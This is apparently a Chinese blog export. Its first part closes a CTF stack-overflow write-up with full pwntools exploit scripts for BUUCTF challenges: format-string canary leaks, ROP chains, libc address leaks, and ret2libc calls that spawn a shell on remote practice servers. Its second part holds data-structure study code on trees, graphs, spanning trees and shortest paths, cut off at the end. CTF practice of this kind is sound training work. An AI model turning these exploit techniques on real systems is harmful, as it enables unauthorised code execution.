就可以利用 ret2libc 来获取 shell 泄露 canary 值 输入 %n$p 来找偏移，n 为偏移量， $p 定位到偏移处， %p 以 16 进制输出 找到一个 nop 指令下断点查看栈的情况 可以看到 6161 下面有一串 16 进制数，这个就是 canary 值，利用 %7$p 就可以泄露它的值，而且看到它在栈的位置是 0x18 泄露 canary: 1234payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16) 另外 pwngbd 提供了一种方便的函数 fmtarg，使用格式为 fmtarg addr。在进入 printf 函数时断下，调用 fmtarg 后可以自动计算格式化参数与 addr 的偏移。fmtarg 在计算 index 时将 RDI 也算了进去，后面会自动减一作为 %$p 的参数： 利用 puts 函数泄露 libc，puts 函数只有一个参数，64 位传参，利用 rdi 寄存器即可，ROPgadget 找 rdi exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from LibcSearcher import *# p = process('./bjdctf_2020_babyrop2')p = remote('node4.buuoj.cn',25998)elf = ELF('./bjdctf_2020_babyrop2')context.log_level = 'debug'payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16)print str(canary)puts_plt = elf.plt['puts']puts_got = elf.got['puts']pop_rdi = 0x400993main_addr = elf.sym['main']vul_addr = 0x400887payload = 'a'*0x18+p64(canary)payload += p64(0)payload +=p64(pop_rdi)payload +=p64(puts_got)payload +=p64(puts_plt)+p64(vul_addr)p.recvuntil('story!\\n')p.sendline(payload)puts_addr = u64(p.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc = LibcSearcher('puts',puts_addr)base = puts_addr-libc.dump('puts')sys_addr = base+libc.dump('system')binsh = base+libc.dump('str_bin_sh')p.recvuntil('story!\\n')payload ='a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)payload +=p64(main_addr)p.sendline(payload)p.interactive() printf 泄露真实地址 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import LibcSearcher#p=process('./babyrop2')p=remote('node3.buuoj.cn',25002)elf=ELF('./babyrop2')read_got=elf.got['read']printf_plt=elf.plt['printf']main_addr=elf.sym['main']format_addr=0x400770&quot;&quot;&quot;0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400730 : pop r14 ; pop r15 ; ret0x0000000000400732 : pop r15 ; ret0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400733 : pop rdi ; ret0x0000000000400731 : pop rsi ; pop r15 ; ret0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004d1 : ret0x0000000000400532 : ret 0x200a&quot;&quot;&quot;payload='a'*40+p64(0x400733)+p64(format_addr)+p64(0x400731)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_addr)p.sendlineafter(&quot;name?&quot;,payload)p.recvuntil('!\\n')read_addr=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))libc=LibcSearcher(&quot;read&quot;,read_addr)libc_base=read_addr-libc.dump('read')sys_addr=libc_base+libc.dump(&quot;system&quot;)binsh_addr=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2='a'*40+p64(0x400733)+p64(binsh_addr)+p64(sys_addr)+p64(0)p.sendline(payload2)p.interactive() # pwn2_sctf_2016 12345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import *#p = process('./pwn')p = remote('node3.buuoj.cn',29130)elf = ELF('./pwn')format_str = 0x080486F8printf_plt = elf.plt['printf']main_addr = elf.symbols['main']printf_got = elf.got['printf']p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')payload = 'a'*0x30 + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)p.sendline(payload)p.recvuntil('said: ')#这是程序正常输出的p.recvuntil('said: ')#这是printf的那个格式化字符串printf_addr = u32(p.recv(4))libc = LibcSearcher('printf', printf_addr)libc_base = printf_addr - libc.dump('printf')sys_addr = libc_base + libc.dump('system')str_bin = libc_base + libc.dump('str_bin_sh')p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')p.sendline('a'*0x30 + p32(sys_addr) + p32(main_addr) + p32(str_bin))p.interactive()#复制自https://blog.csdn.net/qinying001/article/details/104374305 123456789101112131415161718192021222324252627282930313233#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = process('./test1')elf = ELF(&quot;./test1&quot;)libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; *(0xC8+4) + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendlineafter('Welcome!\\n',payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])# libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * (0xC8+4) + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendlineafter('Welcome!\\n',payload)p.interactive()","link":"/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"title":"数据结构基础代码总结（树和图）","text":"树和图部分 # 一、树和二叉树 # 树的遍历 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct BiTNode { ElemType data; struct BiTNode *lchild, *rchild;} BiTNode, *BiTree;//先序遍历//递归void PreOrder(BiTree T) { if (T != NULL) { visit(T); PreOrder(T-&gt;lchild); PreOrder(T-&gt;rchild); }}//非递归void PreOrder2(BiTree T) { InitStack(S); BiTree p = T; while (p || !IsEmpty(S)) { if (p) { visit(p); Push(S, p); p = p-&gt;lchild; } else { Pop(S, p); p = p-&gt;rchild; } }}//中序遍历//递归void InOrder(BiTree T) { if (T != NULL) { InOrder(T-&gt;lchild); visite(T); InOrder(T-&gt;rchild); }}//非递归void InOrder2(BiTree T) { InitStack(S); BiTree p = T; while (p || !IsImpty(S)) { if (p) { push(S, p); p = p-&gt;lchild; } else { Pop(S, p); visit(p); p = p-&gt;rchild; } }}//后序遍历void PostOrder(BiTree T) { if (T != NULL) { PostOrder(T-&gt;lchild); PostOrder(T-&gt;rchild); visit(T); }}//层次遍历void LevelOrder(BiTree T) { InitQueue(Q); BiTree p; EnQueue(Q, T); while (!Empty(Q)) { DeQueue(Q, p); visit(p); if (p-&gt;lchild != NULL) EnQueue(Q, p-&gt;lchild); if (p-&gt;rchild != NULL) EnQueue(Q, p-&gt;rchild); }} # 线索二叉树 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;typedef struct ThreadNode { ElemType data; struct ThreadNode *lchild, *rchild; int ltag, rtag;} ThreadNode, *ThreadTree;//中序线索二叉树//递归void InThread(ThreadTree &amp;p, ThreadTree &amp;pre) { if (p != NULL) { InThread(p-&gt;lchild, pre); //递归，线索化左子树 if (p-&gt;lchild == NULL) { //左子树为空，建立前驱线索 p-&gt;lchild = pre; p-&gt;ltag = 1; } if (pre != NULL &amp;&amp; pre-&gt;rchild == NULL) { pre-&gt;rchild = p; //建立前驱节点的后继线索 pre-&gt;rtag = 1; } pre = p; //标记当前结点为刚刚访问过的结点 InThread(p-&gt;rchild, pre); }}void CreatInThread(ThreadTree T) { ThreadTree pre = NULL; if (T != NULL) { InThead(T, pre); pre-&gt;rchild = NULL; //处理遍历的最后一个结点 pre-&gt;rtag = 1; }} # 遍历 1234567891011121314151617//中序线索树的遍历ThreadNode *Firstnode(ThreadNode *p){ while(p-&gt;ltag==0) p=p-&gt;lchild; return p;}ThreadNode *Nextnode(ThreadNode *p){ if(p-&gt;rtag==0) return Firstnode(p-&gt;rchild); else return p-&gt;rchild;}//不含头结点的中序线索树的中序遍历void Inorder(ThreadNode *T){ for(ThreadNode *p=Firstnode(T);p!=NULL;p=Nextnode(p)) visit(p);} # 二、图 # BFS 广度优先搜索 主要使用队列实现，对每个节点可能到达的路径进行入队出队判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#define MaxVertexNum 100typedef char VertexType;typedef int EdgeType;int Max = 0x3f3f3f3f;typedef struct { VertexType Vex[MaxVertexNum]; EdgeType EdgeType[MaxVertexNum][MaxVertexNum]; int vexnum, arcnum;} Gragh;//BFS遍历bool visited[MaxVertexNum];void BFSTraverse(Graph G) { for (int i = 0; i &lt; G.vexnum; ++i) visited[i] = false; InitQueue(Q); for (int i = 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS(G, i);}void BFS(Graph G, int v) { visit(v); visited[v] = true; Enqueue(Q, v); while (!isEmpty(Q)) { DeQueue(Q, v); for (w = FirstNeighbor(G, v); w &gt;= 0; w = NextNeighbor(G, v, w)) if (!visited[w]) { visit(w); visited[w] = true; EnQueue(Q, w); } }}//BFS求单源最短路径void BFS_MIN_Distance(Graph G, int u) { for (int i = 0; i &lt; G.vexnum; i++) d[i] = Max; //初始化路径为无穷 visited[u] = true; d[u] = 0; EnQueue(Q, u); while (!isEmpty(Q)) { DeQueue(Q, u); for (w = FirstNeighbor(G, u); w &gt;= 0; w = NextNeighbor(G, u, w)) if (!visited[w]) { visited[w] = true; d[w] = d[u] + 1; EnQueue(Q, w); } }} # DFS 深度优先搜索 12345678910111213141516bool visited[MAX_VERTEX_NUM];void DFSTraverse(Graph G){ for(v=0;v&lt;G.vexnum;++v) visited[v]=FALSE; for(v=0;v&lt;G.vexnum;++v) if(!visited[v]) DFS(G,v);}void DFS(Graph G,int v){ visit(v); visited[v]=TRUE; for(w=FirstNeighbor(G,v);w&gt;=0;w=NextNeighbor(G,v,w)) if(!visited[w]){ DFS(G,w); }} # 最小生成树 关于图的几个概念定义： 连通图：在无向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该无向图为连通图。 强连通图：在有向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该有向图为强连通图。 连通网：在连通图中，若图的边具有一定的意义，每一条边都对应着一个数，称为权；权代表着连接连个顶点的代价，称这种连通图叫做连通网。 生成树：一个连通图的生成树是指一个连通子图，它含有图中全部 n 个顶点，但只有足以构成一棵树的 n-1 条边。一颗有 n 个顶点的生成树有且仅有 n-1 条边，如果生成树中再添加一条边，则必定成环。 最小生成树：在连通网的所有生成树中，所有边的代价和最小的生成树，称为最小生成树。 下面介绍两种求最小生成树算法 1.Kruskal 算法 此算法可以称为 “加边法”，初始最小生成树边数为 0，每迭代一次就选择一条满足条件的最小代价边，加入到最小生成树的边集合里。 把图中的所有边按代价从小到大排序； 把图中的 n 个顶点看成独立的 n 棵树组成的森林； 按权值从小到大选择边，所选的边连接的两个顶点 ui,viui,vi, 应属于两颗不同的树，则成为最小生成树的一条边，并将这两颗树合并作为一颗树。 重复 (3), 直到所有顶点都在一颗树内或者有 n-1 条边为止。 Prim 算法 此算法可以称为 “加点法”，每次迭代选择代价最小的边对应的点，加入到最小生成树中。算法从某一个顶点 s 开始，逐渐长大覆盖整个连通网的所有顶点。 图的所有顶点集合为 VV；初始令集合 u={s},v=V−uu={s},v=V−u; 在两个集合 u,vu,v 能够组成的边中，选择一条代价最小的边 (u0,v0)(u0,v0)，加入到最小生成树中，并把 v0v0 并入到集合 u 中。 重复上述步骤，直到最小生成树有 n-1 条边或者 n 个顶点为止。 由于不断向集合 u 中加点，所以最小代价边必须同步更新；需要建立一个辅助数组 closedge, 用来维护集合 v 中每个顶点与集合 u 中最小代价边信息，： 123456struct{ char vertexData //表示u中顶点信息 UINT lowestcost //最小代价}closedge[vexCounts] # Prim 算法 最小生成树是一个图的极小连通子图，它包含原图的所有顶点，并且所有边的权值之和尽可能小。 Prim 算法就是图的最小生成树算法之一，Prim 算法是一种求解加权无向连通图的 MST 问题的贪心算法。它能找出一个边的子集，使得其构成的树包含图中所有顶点，且边的权值之和最小。 Prim 算法以图的顶点为基础，从首个初始顶点，寻找到达其他顶点权值最小的边，并把该顶点加入到 “ 已到达顶点 ” 的集合中，此时，这个集合就是这个图的最小生成树。 一般用一维数组比较方便表达最小生成树，数组下标所对应的元素，代表该顶点在最小生成树当中的父亲节点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// 基于Prim算法实现最小生成树#include &lt;iostream&gt;#include &lt;vector&gt;const int INF = 1e7;using namespace std;vector&lt;vector&lt;int&gt;&gt; Init() { int n, m; cout &lt;&lt; &quot;请输入带权无向图的定点数和边数(以空格隔开):&quot; &lt;&lt; endl; cin &gt;&gt; n &gt;&gt; m; vector&lt;vector&lt;int&gt;&gt; graph(n+1, vector&lt;int&gt;(n+1, INF)); cout &lt;&lt; &quot;请依次输入&quot; &lt;&lt; m &lt;&lt; &quot;条边的开始节点，结束节点，权值(以空格隔开):&quot; &lt;&lt; endl; int start, end, wet; for (int i = 0; i &lt; m; i++) { cin &gt;&gt; start &gt;&gt; end &gt;&gt; wet; graph[start][end] = wet; graph[end][start] = wet; } return graph;}int Prim(vector&lt;vector&lt;int&gt;&gt;&amp; c, int u) { int n = c.size() - 1; // 定义数据结构lowcost[]，closest[]，s[] vector&lt;int&gt; lowcost(n+1); vector&lt;int&gt; closest(n+1); vector&lt;bool&gt; s(n+1); /// 1.初始化lowcost[]，closest[]，s[] s[u] = true; for (int i = 1; i &lt;= n; i++) { if (i != u) { lowcost[i] = c[u][i]; closest[i] = u; s[i] = false; } else lowcost[i] = 0; } // n个节点之间需要找最短路径n-1次 for (int i = 0; i &lt; n-1; i++) { // 2.找最小 int tmp = INF, t = u; for (int j = 1; j &lt;= n; j++) { if (!s[j] &amp;&amp; (lowcost[j] &lt; tmp)) { //!s[j]表示j节点V-U集合中 t = j; tmp = lowcost[j]; } } // 找不到，跳出循环 if (t == u) break; // 将t加入集合U s[t] = true; // 3.更新 for (int j = 1; j &lt;= n; j++) { if ((!s[j]) &amp;&amp; (c[t][j] &lt; lowcost[j])) { lowcost[j] = c[t][j]; closest[j] = t; } } } // 4.打印最终结果 int totalcost = 0; cout &lt;&lt; &quot;lowcost[]数组：&quot;; for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; lowcost[i] &lt;&lt; &quot; &quot;; totalcost += lowcost[i]; } cout &lt;&lt; endl; cout &lt;&lt; &quot;closest[]数组：&quot;; for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; closest[i] &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; return totalcost;}// test main()int main() { vector&lt;vector&lt;int&gt;&gt; graph = Init(); int weight = Prim(graph, 1); // 1表示从1开始找 cout &lt;&lt; &quot;\\n最小生成树总的花费是：&quot; &lt;&lt; weight &lt;&lt; endl;} 实验结果 请输入带权无向图的定点数和边数 (以空格隔开): 7 12 请依次输入 12 条边的开始节点，结束节点，权值 (以空格隔开): 1 2 23 1 6 28 1 7 36 2 3 20 2 7 1 3 4 15 3 7 4 4 5 3 4 7 9 5 6 17 5 7 16 6 7 25 lowcost [] 数组：0 23 4 9 3 17 1 closest [] 数组：0 1 7 7 4 5 2 最小生成树总的花费是：57 D:\\projects\\test\\x64\\Release\\test.exe (进程 1788) 已退出，返回代码为: 0。 # Kruskal 算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159/************************************************************************CSDN 勿在浮沙筑高台 http://blog.csdn.net/luoshixian099算法导论--最小生成树（Prim、Kruskal）2016年7月14日************************************************************************/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;algorithm&gt;using namespace std;#define INFINITE 0xFFFFFFFF #define VertexData unsigned int //顶点数据#define UINT unsigned int#define vexCounts 6 //顶点数量char vextex[] = { 'A', 'B', 'C', 'D', 'E', 'F' };struct node { VertexData data; unsigned int lowestcost;}closedge[vexCounts]; //Prim算法中的辅助信息typedef struct { VertexData u; VertexData v; unsigned int cost; //边的代价}Arc; //原始图的边信息void AdjMatrix(unsigned int adjMat[][vexCounts]) //邻接矩阵表示法{ for (int i = 0; i &lt; vexCounts; i++) //初始化邻接矩阵 for (int j = 0; j &lt; vexCounts; j++) { adjMat[i][j] = INFINITE; } adjMat[0][1] = 6; adjMat[0][2] = 1; adjMat[0][3] = 5; adjMat[1][0] = 6; adjMat[1][2] = 5; adjMat[1][4] = 3; adjMat[2][0] = 1; adjMat[2][1] = 5; adjMat[2][3] = 5; adjMat[2][4] = 6; adjMat[2][5] = 4; adjMat[3][0] = 5; adjMat[3][2] = 5; adjMat[3][5] = 2; adjMat[4][1] = 3; adjMat[4][2] = 6; adjMat[4][5] = 6; adjMat[5][2] = 4; adjMat[5][3] = 2; adjMat[5][4] = 6;}int Minmum(struct node * closedge) //返回最小代价边{ unsigned int min = INFINITE; int index = -1; for (int i = 0; i &lt; vexCounts;i++) { if (closedge[i].lowestcost &lt; min &amp;&amp; closedge[i].lowestcost !=0) { min = closedge[i].lowestcost; index = i; } } return index;}void MiniSpanTree_Prim(unsigned int adjMat[][vexCounts], VertexData s){ for (int i = 0; i &lt; vexCounts;i++) { closedge[i].lowestcost = INFINITE; } closedge[s].data = s; //从顶点s开始 closedge[s].lowestcost = 0; for (int i = 0; i &lt; vexCounts;i++) //初始化辅助数组 { if (i != s) { closedge[i].data = s; closedge[i].lowestcost = adjMat[s][i]; } } for (int e = 1; e &lt;= vexCounts -1; e++) //n-1条边时退出 { int k = Minmum(closedge); //选择最小代价边 cout &lt;&lt; vextex[closedge[k].data] &lt;&lt; &quot;--&quot; &lt;&lt; vextex[k] &lt;&lt; endl;//加入到最小生成树 closedge[k].lowestcost = 0; //代价置为0 for (int i = 0; i &lt; vexCounts;i++) //更新v中顶点最小代价边信息 { if ( adjMat[k][i] &lt; closedge[i].lowestcost) { closedge[i].data = k; closedge[i].lowestcost = adjMat[k][i]; } } }}void ReadArc(unsigned int adjMat[][vexCounts],vector&lt;Arc&gt; &amp;vertexArc) //保存图的边代价信息{ Arc * temp = NULL; for (unsigned int i = 0; i &lt; vexCounts;i++) { for (unsigned int j = 0; j &lt; i; j++) { if (adjMat[i][j]!=INFINITE) { temp = new Arc; temp-&gt;u = i; temp-&gt;v = j; temp-&gt;cost = adjMat[i][j]; vertexArc.push_back(*temp); } } }}bool compare(Arc A, Arc B){ return A.cost &lt; B.cost ? true : false;}bool FindTree(VertexData u, VertexData v,vector&lt;vector&lt;VertexData&gt; &gt; &amp;Tree){ unsigned int index_u = INFINITE; unsigned int index_v = INFINITE; for (unsigned int i = 0; i &lt; Tree.size();i++) //检查u,v分别属于哪颗树 { if (find(Tree[i].begin(), Tree[i].end(), u) != Tree[i].end()) index_u = i; if (find(Tree[i].begin(), Tree[i].end(), v) != Tree[i].end()) index_v = i; } if (index_u != index_v) //u,v不在一颗树上，合并两颗树 { for (unsigned int i = 0; i &lt; Tree[index_v].size();i++) { Tree[index_u].push_back(Tree[index_v][i]); } Tree[index_v].clear(); return true; } return false;}void MiniSpanTree_Kruskal(unsigned int adjMat[][vexCounts]){ vector&lt;Arc&gt; vertexArc; ReadArc(adjMat, vertexArc);//读取边信息 sort(vertexArc.begin(), vertexArc.end(), compare);//边按从小到大排序 vector&lt;vector&lt;VertexData&gt; &gt; Tree(vexCounts); //6棵独立树 for (unsigned int i = 0; i &lt; vexCounts; i++) { Tree[i].push_back(i); //初始化6棵独立树的信息 } for (unsigned int i = 0; i &lt; vertexArc.size(); i++)//依次从小到大取最小代价边 { VertexData u = vertexArc[i].u; VertexData v = vertexArc[i].v; if (FindTree(u, v, Tree))//检查此边的两个顶点是否在一颗树内 { cout &lt;&lt; vextex[u] &lt;&lt; &quot;---&quot; &lt;&lt; vextex[v] &lt;&lt; endl;//把此边加入到最小生成树中 } }} int main(){ unsigned int adjMat[vexCounts][vexCounts] = { 0 }; AdjMatrix(adjMat); //邻接矩阵 cout &lt;&lt; &quot;Prim :&quot; &lt;&lt; endl; MiniSpanTree_Prim(adjMat,0); //Prim算法，从顶点0开始. cout &lt;&lt; &quot;-------------&quot; &lt;&lt; endl &lt;&lt; &quot;Kruskal:&quot; &lt;&lt; endl; MiniSpanTree_Kruskal(adjMat);//Kruskal算法 return 0;} # Dijkstra 算法 (求单源最短路径问题) # 算法原理 适合求解有回路的带权图的最短路径 可以求任意两个顶点的最短路径 不适合求带负权值的最短路径问题 具体解释 # 邻接矩阵实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;queue&gt;#include&lt;vector&gt;using namespace std;//用邻接矩阵构建有向图#define MAX 999//表示无穷#define MVNum 20//最大结点数typedef int VertexType;//设置结点的数据类型为int型（方便后续修改成char...）typedef int ArcType;//设置的权值为int型（方便后续修改成float...）class Graph//Adjacency Matrix Graph有向图，用邻接矩阵表示{public: void Create(); int LocateVex(VertexType u);//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1 int firstadj(int v); int nextadj(int v, int w); void Dijkstra(VertexType start_point);//使用迪杰斯特拉算法打印单源最短路径 void Show();//调试用，打印邻接矩阵private: VertexType vexs[MVNum];//顶点表,将顶点保存的信息存入此处 ArcType arcs[MVNum][MVNum];//邻接矩阵 int vexnum, arcnum;//图当前的顶点数和边数 vector&lt;queue&lt;VertexType&gt;&gt;path;//保存各结点最短路径的path[i] ArcType dist[MVNum];//最短路径大小 bool solved[MVNum];//是否找到最短路径};int Graph::LocateVex(VertexType u){//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1 int i; for (i = 0; i &lt; this-&gt;vexnum; i++) { if (u == this-&gt;vexs[i]) return i; } return -1;}int Graph::firstadj(int v){ for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[v][i] != MAX) return i; } return -1;}int Graph::nextadj(int v, int w){ for (int i = w + 1; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[v][i] != MAX) return i; } return -1;}void Graph::Show(){ for (int i = 0; i &lt; this-&gt;vexnum; i++) { for (int j = 0; j &lt; this-&gt;vexnum; j++) { cout &lt;&lt; setw(4) &lt;&lt; this-&gt;arcs[i][j] &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; }}void Graph::Create(){ cout &lt;&lt; &quot;请输入总结点数和总边数:&quot;; cin &gt;&gt; this-&gt;vexnum &gt;&gt; this-&gt;arcnum;//输入总顶点数和总边数 cout &lt;&lt; &quot;请输入各结点的信息:&quot;; for (int i = 0; i &lt; this-&gt;vexnum; i++) { cin &gt;&gt; this-&gt;vexs[i]; } //初始化邻接矩阵 for (int i = 0; i &lt; this-&gt;vexnum; i++) { for (int j = 0; j &lt; this-&gt;vexnum; j++) { this-&gt;arcs[i][j] = MAX; } } //构造邻接矩阵 for (int i = 0; i &lt; this-&gt;arcnum; i++) { int v1, v2, w; cout &lt;&lt; &quot;请输入第&quot; &lt;&lt; i + 1 &lt;&lt; &quot;条边的起点和终点及其对应的权值:&quot;; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int m = LocateVex(v1); int n = LocateVex(v2); this-&gt;arcs[m][n] = w; } return;}void Graph::Dijkstra(VertexType start_point){ //初始化最短距离数组 for (int i = 0; i &lt; this-&gt;vexnum; i++) { this-&gt;dist[i] = MAX; } dist[this-&gt;LocateVex(start_point)] = 0; //初始化保存路径的向量 queue&lt;VertexType&gt;temp; temp.push(start_point); for (int i = 0; i &lt; this-&gt;vexnum; i++) { //（移到for外）queue&lt;VertexType&gt;temp; //temp.push(start_point); path.push_back(temp); //（不可行）path[i].push(start_point);//将起点作为最初始的路径加入每个结点对应的队列中 } //初始化solved数组 for (int i = 0; i &lt; this-&gt;vexnum; i++) { solved[i] = false; } for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[this-&gt;LocateVex(start_point)][i] != MAX) { dist[i] = this-&gt;arcs[this-&gt;LocateVex(start_point)][i]; path[i].push(this-&gt;vexs[i]); } } solved[this-&gt;LocateVex(start_point)] = true; for (int i = 0; i &lt; this-&gt;vexnum; i++) {//返回地找 ArcType mind = MAX; int v = i; for (int j = 0; j &lt; this-&gt;vexnum; j++) {//一个劲地往前走 //（移出for）int v = i; if (!solved[j] &amp;&amp; dist[j] &lt; mind) { mind = dist[j]; v = j; } solved[v] = true; int w = this-&gt;firstadj(v); while (w != -1) { if (dist[v] + this-&gt;arcs[v][w] &lt; dist[w]) { dist[w] = dist[v] + this-&gt;arcs[v][w]; path[w] = path[v]; path[w].push(vexs[w]); } w = this-&gt;nextadj(v, w); } } } cout &lt;&lt; &quot;从结点&quot; &lt;&lt; start_point &lt;&lt; &quot;开始到各点的最短路径和路径长度如下:&quot;&lt;&lt;endl; for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (dist[i] == MAX) { cout &lt;&lt; &quot;无法到达结点&quot; &lt;&lt; this-&gt;vexs[i] &lt;&lt; endl; } else { cout &lt;&lt; &quot;抵达结点&quot; &lt;&lt; this-&gt;vexs[i] &lt;&lt; &quot;的最短路径:&quot;; int path_length = path[i].size(); for (int j = 0; j &lt; path_length; j++) { cout &lt;&lt; path[i].front() &lt;&lt; &quot; &quot;; path[i].pop(); } cout &lt;&lt; &quot;长度为&quot; &lt;&lt; dist[i] &lt;&lt; endl; } }}int main(){ Graph s; s.Create(); s.Show(); VertexType start_point; cout &lt;&lt; &quot;请输入起点:&quot;; cin &gt;&gt; start_point; s.Dijkstra(start_point); system(&quot;pause&quot;); return 0;} 结果: 参考文章 # 邻接表实现 待定 # Floyd 算法 (求多源最短路径问题) # 算法思想 概括为迭代更新 i 经由 k 到 j 的最短路径. # 算法原理 从任意一条单边路径开始。所有两点之间的距离是边的权，如果两点之间没有边相连，则权为无穷大。 对于每一对顶点 u 和 v，看看是否存在一个顶点 w 使得从 u 到 w 再到 v 比已知的路径更短。如果是更新它。 把图用邻接矩阵 G 表示出来，如果从 Vi 到 Vj 有路可达，则 G [i][j]=d，d 表示该路的长度；否则 G [i][j]= 无穷大。定义一个矩阵 D 用来记录所插入点的信息，D [i][j] 表示从 Vi 到 Vj 需要经过的点，初始化 D [i][j]=j。把各个顶点插入图中，比较插点后的距离与原来的距离，G [i][j]= min ( G [i][j], G [i][k]+G [k][j] )，如果 G [i][j] 的值变小，则 D [i][j]=k。在 G 中包含有两点之间最短道路的信息，而在 D 中则包含了最短通路径的信息。 比如，要寻找从 V5 到 V1 的路径。根据 D，假如 D (5,1)=3 则说明从 V5 到 V1 经过 V3，路径为 {V5,V3,V1}，如果 D (5,3)=3，说明 V5 与 V3 直接相连，如果 D (3,1)=1，说明 V3 与 V1 直接相连。 # 邻接矩阵实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include&lt;stdio.h&gt;#include&lt;malloc.h&gt;#define MAXV 7 //最大顶点个数 #define INF 32767 //定义 ∞//∞ == 32767 ,int 型的最大范围（2位）= 2^(2*8-1)，TC告诉我们int占用2个字节，而VC和LGCC告诉我们int占用4个字节//图：Graph//顶点：Vertex//邻接：Adjacency//矩阵：Matrix//表：List//边：Edge typedef struct vertex { int number; //顶点的编号 }VertexType; //别名，顶点的类型 typedef struct matrix { int n; //顶点个数 int e; //边数 int adjMat[MAXV][MAXV]; //邻接矩阵数组 VertexType ver[MAXV]; //存放顶点信息 }MatGraph; //别名，完整的图邻接矩阵类型typedef struct eNode { int adjVer; //该边的邻接点编号 int weiLGht; //该边的的信息，如权值 struct eNode* nextEdLGe; //指向下一条边的指针 }EdgeNode; //别名，边结点的类型 typedef struct vNode { EdgeNode* firstEdLGe; //指向第一个边结点 }VNode; //别名，邻接表的头结点类型 typedef struct list { int n; //顶点个数 int e; //边数 VNode adjList[MAXV]; //邻接表的头结点数组 }ListGraph; //别名，完整的图邻接表类型 //创建图的邻接表 void createAdjListGraph(ListGraph*&amp; LG, int A[MAXV][MAXV], int n, int e) { int i, j; EdgeNode* p; LG = (ListGraph*)malloc(sizeof(ListGraph)); for (i = 0; i &lt; n; i++) { LG-&gt;adjList[i].firstEdLGe = NULL; //给邻接表中所有头结点指针域置初值 } for (i = 0; i &lt; n; i++) { //检查邻接矩阵中的每个元素 for (j = n - 1; j &gt;= 0; j--) { if (A[i][j] != 0) { //存在一条边 p = (EdgeNode*)malloc(sizeof(EdgeNode)); //申请一个结点内存 p-&gt;adjVer = j; //存放邻接点 p-&gt;weiLGht = A[i][j]; //存放权值 p-&gt;nextEdLGe = NULL; p-&gt;nextEdLGe = LG-&gt;adjList[i].firstEdLGe; //头插法 LG-&gt;adjList[i].firstEdLGe = p; } } } LG-&gt;n = n; LG-&gt;e = e;}//输出邻接表 void displayAdjList(ListGraph* LG) { int i; EdgeNode* p; for (i 